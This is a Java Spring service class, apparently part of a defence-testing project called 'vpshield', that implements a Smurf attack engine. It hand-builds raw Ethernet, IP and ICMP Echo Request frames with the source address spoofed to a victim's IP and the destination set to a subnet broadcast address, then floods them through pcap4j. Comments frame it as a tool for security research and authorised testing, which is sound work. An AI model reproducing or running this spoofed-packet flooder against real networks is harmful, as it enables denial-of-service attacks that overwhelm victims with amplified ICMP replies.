package com.ethan.vpshield.service;

import com.ethan.vpshield.config.ShieldProperties;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.pcap4j.core.*;
import org.pcap4j.util.MacAddress;
import org.springframework.stereotype.Service;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 攻击模拟引擎
 * 实现 Smurf 攻击逻辑，用于安全研究和测试防御系统
 *
 * Smurf 攻击原理：
 * 1. 攻击者构造 ICMP Echo Request 包
 * 2. 源 IP 伪造为受害者 IP
 * 3. 目的 IP 设为子网广播地址
 * 4. 子网内所有主机都会向受害者发送 ICMP Reply
 * 5. 受害者被大量 Reply 淹没
 *
 * 警告：此功能仅供安全研究和授权测试使用！
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class AttackEngine {

    private final ShieldProperties properties;

    private final AtomicBoolean attacking = new AtomicBoolean(false);

    @Getter
    private final AtomicLong packetsSent = new AtomicLong(0);

    private Thread attackThread;

    private PcapHandle sendHandle;

    /**
     * 启动 Smurf 攻击模拟
     */
    public synchronized void startSmurfAttack(String victimIp,
                                               String broadcastIp,
                                               int packetCount,
                                               String interfaceName) {
        if (attacking.get()) {
            log.warn("攻击已在进行中");
            return;
        }

        log.warn("启动 Smurf 攻击模拟 - 目标: {}, 广播: {}, 包数: {}",
                victimIp, broadcastIp, packetCount);

        try {
            PcapNetworkInterface nif = NetworkInterfaceUtil.selectInterface(interfaceName);
            if (nif == null) {
                throw new PcapNativeException("未找到可用网络接口");
            }

            sendHandle = nif.openLive(
                    65535,
                    PcapNetworkInterface.PromiscuousMode.PROMISCUOUS,
                    100
            );

            attacking.set(true);
            packetsSent.set(0);

            attackThread = new Thread(
                    () -> executeAttack(victimIp, broadcastIp, packetCount),
                    "smurf-attack"
            );
            attackThread.setDaemon(true);
            attackThread.start();

        } catch (PcapNativeException e) {
            log.error("启动攻击失败", e);
            closeSendHandle();
        }
    }

    /**
     * 停止攻击
     */
    public synchronized void stopAttack() {
        if (!attacking.get()) {
            return;
        }

        attacking.set(false);

        if (attackThread != null) {
            attackThread.interrupt();
            try {
                attackThread.join(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }

        closeSendHandle();
        log.info("攻击已停止，共发送 {} 个包", packetsSent.get());
    }

    /**
     * 执行攻击循环
     */
    private void executeAttack(String victimIp, String broadcastIp, int packetCount) {
        try {
            Inet4Address srcAddr = (Inet4Address) InetAddress.getByName(victimIp);
            Inet4Address dstAddr = (Inet4Address) InetAddress.getByName(broadcastIp);

            byte[] packet = buildIcmpEchoRequest(srcAddr, dstAddr);

            long intervalNs = TimeUnit.MILLISECONDS.toNanos(properties.getAttack().getPacketIntervalMs());

            for (int i = 0; i < packetCount && attacking.get(); i++) {
                sendHandle.sendPacket(packet);
                packetsSent.incrementAndGet();

                if (intervalNs > 0) {
                    TimeUnit.NANOSECONDS.sleep(intervalNs);
                }
            }

        } catch (UnknownHostException e) {
            log.error("无效的 IP 地址", e);
        } catch (PcapNativeException | NotOpenException e) {
            log.error("发送数据包失败", e);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            attacking.set(false);
            closeSendHandle();
        }
    }

    /**
     * 手动构造 ICMP Echo Request 数据包
     * 避免依赖 Pcap4j 的常量 API
     *
     * @param srcAddr 源地址（伪造的受害者 IP）
     * @param dstAddr 目的地址（广播地址）
     * @return 原始数据包字节数组
     */
    private byte[] buildIcmpEchoRequest(Inet4Address srcAddr, Inet4Address dstAddr) {
        // ICMP Echo Request 数据（56 字节）
        byte[] echoData = new byte[56];
        for (int i = 0; i < echoData.length; i++) {
            echoData[i] = (byte) i;
        }

        // 计算 ICMP 包大小
        int icmpSize = 8 + echoData.length; // ICMP header (8 bytes) + data
        int ipSize = 20 + icmpSize;         // IP header (20 bytes) + ICMP
        int frameSize = 14 + ipSize;        // Ethernet header (14 bytes) + IP

        ByteBuffer buffer = ByteBuffer.allocate(frameSize);

        // ===== Ethernet Header (14 bytes) =====
        // Destination MAC: Broadcast FF:FF:FF:FF:FF:FF
        buffer.put((byte) 0xFF);
        buffer.put((byte) 0xFF);
        buffer.put((byte) 0xFF);
        buffer.put((byte) 0xFF);
        buffer.put((byte) 0xFF);
        buffer.put((byte) 0xFF);

        // Source MAC: 00:00:00:00:00:00 (让网卡填充)
        for (int i = 0; i < 6; i++) {
            buffer.put((byte) 0x00);
        }

        // EtherType: IPv4 (0x0800)
        buffer.putShort((short) 0x0800);

        // ===== IP Header (20 bytes) =====
        buffer.put((byte) 0x45);              // Version (4) + IHL (5)
        buffer.put((byte) 0x00);              // TOS
        buffer.putShort((short) ipSize);      // Total Length
        buffer.putShort((short) (packetsSent.get() & 0xFFFF)); // Identification
        buffer.putShort((short) 0x0000);      // Flags + Fragment Offset
        buffer.put((byte) 64);                // TTL
        buffer.put((byte) 1);                 // Protocol: ICMP (1)
        buffer.putShort((short) 0);           // Header Checksum (placeholder)
        buffer.put(srcAddr.getAddress());     // Source IP
        buffer.put(dstAddr.getAddress());     // Destination IP

        // 计算 IP 校验和
        int ipChecksum = calculateChecksum(buffer.array(), 14, 20);
        buffer.putShort(24, (short) ipChecksum);

        // ===== ICMP Header (8 bytes) =====
        buffer.put((byte) 8);                 // Type: Echo Request
        buffer.put((byte) 0);                 // Code: 0
        buffer.putShort((short) 0);           // Checksum (placeholder)
        buffer.putShort((short) 0x1234);      // Identifier
        buffer.putShort((short) (packetsSent.get() & 0xFFFF)); // Sequence Number

        // ===== ICMP Data =====
        buffer.put(echoData);

        // 计算 ICMP 校验和
        int icmpChecksum = calculateChecksum(buffer.array(), 34, icmpSize);
        buffer.putShort(36, (short) icmpChecksum);

        return buffer.array();
    }

    /**
     * 计算校验和
     */
    private int calculateChecksum(byte[] data, int offset, int length) {
        int sum = 0;
        int end = offset + length;

        for (int i = offset; i < end; i += 2) {
            if (i + 1 < end) {
                sum += ((data[i] & 0xFF) << 8) | (data[i + 1] & 0xFF);
            } else {
                sum += (data[i] & 0xFF) << 8;
            }
        }

        while (sum >> 16 != 0) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }

        return ~sum & 0xFFFF;
    }

    private void closeSendHandle() {
        if (sendHandle != null) {
            try {
                if (sendHandle.isOpen()) {
                    sendHandle.close();
                }
            } catch (Exception e) {
                log.warn("关闭发送句柄失败", e);
            }
            sendHandle = null;
        }
    }

    public boolean isAttacking() {
        return attacking.get();
    }
}